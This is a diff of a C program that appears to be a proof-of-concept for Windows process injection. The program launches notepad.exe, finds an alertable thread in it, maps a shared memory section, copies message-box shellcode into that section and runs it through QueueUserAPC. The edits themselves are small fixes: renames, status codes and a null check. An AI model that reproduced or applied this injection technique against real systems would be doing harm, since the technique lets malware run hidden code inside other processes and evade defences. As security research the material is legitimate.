@@ -5,6 +5,7 @@
 // Definitions
 //
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#define STATUS_OPEN_FAILED  0xC0000136
 
 // ReSharper disable CppInconsistentNaming
 typedef struct _LSA_UNICODE_STRING { USHORT Length;	USHORT MaximumLength; PWSTR  Buffer; } UNICODE_STRING, * PUNICODE_STRING;
@@ -17,7 +18,7 @@ typedef NTSTATUS(__stdcall* RTLCREATEUSERTHREAD)(HANDLE, PSECURITY_DESCRIPTOR, B
 typedef NTSTATUS(__stdcall* NTCLOSE)(HANDLE);
 // ReSharper restore CppInconsistentNaming
 
-HANDLE FindAllertableThread(HANDLE, DWORD);
+HANDLE FindAlertableThread(HANDLE, DWORD);
 
 INT main() {
     NTSTATUS				ntStatus;
@@ -63,21 +64,24 @@ INT main() {
     startupInfo.cb = sizeof startupInfo;
     ZeroMemory(&processInformation, sizeof processInformation);
 
-    if (!CreateProcessA(NULL, "\"calc.exe\"", NULL, NULL, FALSE,
+    if (!CreateProcessA(NULL, "\"notepad.exe\"", NULL, NULL, FALSE,
         DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
-        return ERROR_CREATE_FAILED;
+        return STATUS_OPEN_FAILED;
     }
 
     dwPid = processInformation.dwProcessId;
     if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
-        lRetVal = ERROR_OPEN_FAILED;
+        lRetVal = STATUS_OPEN_FAILED;
         goto Cleanup;
     }
 
     //
     // Find allertable thread
     //
-    hTread = FindAllertableThread(hProcess, dwPid);
+    hTread = FindAlertableThread(hProcess, dwPid);
+	if (!hTread) {
+        return STATUS_INVALID_HANDLE;
+	}
 
     //
     // Create a section
@@ -111,7 +115,7 @@ INT main() {
     memcpy(pLocalSectionAddress, bMessageboxShellcode64, sizeof bMessageboxShellcode64);
 
     apcRoutine = (PTHREAD_START_ROUTINE)pRemoteSectionAddress;
-    QueueUserAPC((PAPCFUNC)apcRoutine, hTread, NULL);
+    QueueUserAPC((PAPCFUNC)apcRoutine, hTread, 0);
     Sleep(1000 * 2);
 
 Cleanup:
@@ -157,7 +161,7 @@ BOOL IsAlertable(HANDLE hProcess, HANDLE hThread, LPVOID lpAddr[6]) {
                 break;
             }
             // NtWaitForMultipleObjects
-            case 2: {
+            case 2: {                                                                                                       // NOLINT(bugprone-branch-clone)
                 bAlertable = (context.Rsi & TRUE);
                 break;
             }
@@ -214,7 +218,7 @@ DWORD WINAPI ThreadProc(LPVOID lpParameter) {
     return 0;
 }
 
-HANDLE FindAllertableThread(HANDLE hProcess, DWORD dwPid) {
+HANDLE FindAlertableThread(HANDLE hProcess, DWORD dwPid) {
     HANDLE        hSnapshot, hTread, hEvent[2], hReturn = NULL;
     LPVOID        rm, pSetEvent, f[6];
     THREADENTRY32 threadEntry;
